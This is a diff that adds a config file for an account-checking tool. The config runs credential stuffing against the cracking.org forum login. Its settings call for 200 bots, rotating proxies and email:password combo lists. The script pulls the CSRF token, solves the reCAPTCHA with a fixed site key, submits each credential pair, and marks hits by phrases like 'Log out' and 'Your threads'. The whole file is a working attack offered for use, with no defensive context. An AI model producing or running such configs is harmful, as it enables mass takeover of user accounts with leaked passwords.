@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "cracking.org",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-14T05:24:24.7860556-07:00",
+  "AdditionalInfo": "https://github.com/GeniLoyd/swatconfigs",
+  "Author": "SWAT - BREAKINGIN.TO",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get REQUEST GET "https://cracking.org/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://cracking.org" 
+  HEADER "referer: https://cracking.org/login/" 
+
+#token PARSE "<SOURCE>" LR "name=\"_xfToken\" value=\"" "\" />" -> VAR "token" 
+
+RECAPTCHA "https://cracking.org/login" "6LceWRwTAAAAAIXA2oukvEigzhY-4hJFlcjZJ4qh" -> VAR "capt" 
+
+REQUEST POST "https://cracking.org/login/login" 
+  CONTENT "login=<USER>&password=<PASS>&g-recaptcha-response=<capt>&remember=1&_xfRedirect=%2F&_xfToken=<token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Log out" 
+    KEY "Your threads" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect password. Please try again." 
+    KEY "The requested user" 
+    KEY "could not be found." 
+
